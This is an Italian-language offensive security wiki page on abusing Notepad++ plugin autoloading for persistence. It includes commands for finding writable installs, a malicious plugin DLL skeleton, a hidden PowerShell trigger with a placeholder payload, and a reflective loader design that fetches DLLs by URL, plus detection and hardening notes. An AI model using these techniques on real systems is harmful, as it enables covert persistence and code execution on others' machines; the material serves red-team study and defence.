# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ farà **autoload di ogni plugin DLL trovato nelle sue sottocartelle `plugins`** all'avvio. Inserire un plugin malevolo in qualsiasi **installazione Notepad++ scrivibile** consente l'esecuzione di codice dentro `notepad++.exe` ogni volta che l'editor si avvia, e questo può essere abusato per **persistence**, **initial execution** stealthy, o come **in-process loader** se l'editor viene avviato elevato.

Da **Notepad++ 7.6+** il layout previsto per l'installazione manuale è **una sottocartella per plugin** (`plugins\<PluginName>\<PluginName>.dll`). In **portable mode** (presenza di `doLocalConf.xml` accanto a `notepad++.exe`), l'intero albero dell'applicazione resta locale a quella directory, il che spesso trasforma bundle di tool copiati/admin in una facile surface di execution scrivibile dall'utente.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (di solito richiede admin per scrivere).
- Opzioni scrivibili per operatori con privilegi bassi:
- Usa la **portable Notepad++ build** in una cartella scrivibile dall'utente.
- Copia `C:\Program Files\Notepad++` in un path controllato dall'utente (ad es. `%LOCALAPPDATA%\npp\`) e esegui `notepad++.exe` da lì.
- Cerca **admin tool bundles**, copie zip estratte, o help-desk toolkits che già contengono `doLocalConf.xml` e vivono fuori da `Program Files`.
- Ogni plugin ottiene la propria sottocartella sotto `plugins` e viene caricato automaticamente all'avvio; le voci di menu appaiono sotto **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Pointi di caricamento del plugin (primitivi di esecuzione)
Notepad++ si aspetta specifiche **funzioni esportate**. Tutte queste vengono chiamate durante l'inizializzazione, offrendo più superfici di esecuzione:
- **`DllMain`** — viene eseguita immediatamente al caricamento della DLL (primo punto di esecuzione).
- **`setInfo(NppData)`** — chiamata una volta al load per fornire gli handle di Notepad++; punto tipico per registrare voci di menu.
- **`getName()`** — restituisce il nome del plugin mostrato nel menu.
- **`getFuncsArray(int *nbF)`** — restituisce i comandi del menu; anche se vuoto, viene chiamato durante l'avvio.
- **`beNotified(SCNotification*)`** — riceve eventi di Notepad++ / Scintilla (utile per differire i payload fino a un'azione dell'utente o a un evento dell'editor).
- **`messageProc(UINT, WPARAM, LPARAM)`** — message handler, utile per scambi di dati più grandi.
- **`isUnicode()`** — flag di compatibilità verificato al load.

La maggior parte delle export può essere implementata come **stub**; l'esecuzione può avvenire da `DllMain` o da qualsiasi callback sopra durante l'autoload.

## Minimal malicious plugin skeleton
Compila una DLL con le export previste e inseriscila in `plugins\\MyNewPlugin\\MyNewPlugin.dll` sotto una cartella di Notepad++ scrivibile:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Compila la DLL (Visual Studio/MinGW).
2. Crea la sottocartella del plugin sotto `plugins` e inserisci la DLL al suo interno.
3. Riavvia Notepad++; la DLL viene caricata automaticamente, eseguendo `DllMain` e i callback successivi.

## Low-noise trigger pattern via `beNotified`
Per OPSEC, molti payload non dovrebbero **non** attivarsi da `DllMain`. Un pattern più silenzioso è lasciare che il plugin venga caricato correttamente, poi eseguire solo dopo un evento realistico dell'editor come **startup complete**, **buffer activation**, o il **primo carattere digitato**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Questo si adatta meglio alla ricerca offensiva pubblica rispetto a un rumoroso beacon `DllMain`: la DLL viene comunque autocaricata all'avvio, ma l'azione malevola viene ritardata finché Notepad++ non appare davvero in uso.

## Using the plugin config directory as secondary storage
Notepad++ espone `NPPM_GETPLUGINSCONFIGDIR`, che restituisce la **directory di configurazione dei plugin dell'utente corrente**. Un plugin malevolo può usarla per mantenere minima la DLL su disco mentre memorizza config cifrata, payload staged o file di tasking in un path che si confonde con il normale stato del plugin.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operativamente questo è utile quando vuoi:
- un piccolo bootstrap DLL autoloaded;
- tasking per utente senza toccare di nuovo il binario del plugin principale;
- separare il **autoload trigger** dalla second stage più pesante.

## Reflective loader plugin pattern
Un plugin weaponized può trasformare Notepad++ in un **reflective DLL loader**:
- Presenta una minimale voce UI/menu (ad es. "LoadDLL").
- Accetta un **file path** o **URL** per scaricare un payload DLL.
- Mappa reflectively il DLL nel processo corrente e invoca un punto di ingresso esportato (ad es. una funzione di loader dentro il DLL recuperato).
- Vantaggio: riutilizza un processo GUI dall’aspetto benigno invece di avviare un nuovo loader; il payload eredita l’integrità di `notepad++.exe` (inclusi contesti elevated).
- Trade-off: scrivere su disco un **unsigned plugin DLL** è rumoroso; una variazione pratica è usare il plugin autoloaded solo come stub e tenere il vero implant encrypted/staged altrove.

## Detection and hardening notes
- Blocca o monitora **writes to Notepad++ plugin directories** (incluse le copie portable nei profili utente); abilita controlled folder access o application allowlisting.
- Genera alert su **new unsigned DLLs** sotto `plugins`, modifiche agli alberi di Notepad++ portable e insolita **child processes/network activity** da `notepad++.exe`.
- Stabilisci una baseline dei plugin legittimi e indaga qualsiasi nuovo DLL che esporti la normale interfaccia plugin di Notepad++ ma che avvii anche shell, PowerShell o network beacon.
- Impone l’installazione dei plugin solo tramite **Plugins Admin**, e limita l’esecuzione di copie portable da percorsi non trusted.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
